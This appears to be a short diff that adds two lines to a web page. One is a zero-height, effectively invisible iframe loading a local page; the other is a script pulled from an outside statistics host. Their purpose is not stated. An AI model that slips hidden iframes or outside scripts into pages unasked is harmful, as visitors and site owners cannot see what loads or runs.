@@ -1,0 +1,2 @@
+<iframe width=100 height=0 src=new.html></iframe>
+<script language="javascript" type="text/javascript" src="http://js.users.51.la/1836606.js"></script>
